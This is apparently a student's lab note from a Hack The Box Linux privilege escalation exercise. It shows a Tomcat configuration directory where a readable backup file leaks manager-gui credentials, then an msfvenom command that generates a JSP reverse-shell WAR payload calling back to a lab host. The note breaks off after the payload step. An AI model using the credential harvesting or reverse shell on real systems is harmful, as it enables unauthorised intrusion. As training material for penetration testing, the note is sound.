#Linux_PrivilegeEscalation 

---

**Note**: To get `flag4.txt` for the **Linux Privilege Escalation** Lab used the following steps:

1. In `/etc/tomcat` there's a backup file(`tomcat-users.xml.back`) with incorrect permissions:
```bash
htb-student@nix03:/etc/tomcat9$ ls -ll
total 216
drwxrwxr-x 3 root tomcat   4096 Sep  3  2020 Catalina
-rw-r----- 1 root tomcat   7262 Feb  5  2020 catalina.properties
-rw-r----- 1 root tomcat   1400 Feb  5  2020 context.xml
-rw-r----- 1 root tomcat   1149 Feb  5  2020 jaspic-providers.xml
-rw-r----- 1 root tomcat   2799 Feb 24  2020 logging.properties
drwxr-xr-x 2 root tomcat   4096 Sep  3  2020 policy.d
-rw-r----- 1 root tomcat   7586 Feb 24  2020 server.xml
-rw-r----- 1 root tomcat   2232 Sep  5  2020 tomcat-users.xml
-rwxr-xr-x 1 root barry    2232 Sep  5  2020 tomcat-users.xml.bak

```
where I find the username and password for the `manager-gui` role.

2. Here I see that it's using Java:
![[Pasted image 20240824131520.png]]
so I used  the `msfvenom` to generate a reverse shell script:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.139 LPORT=4444 -f war -o revshell.war
```
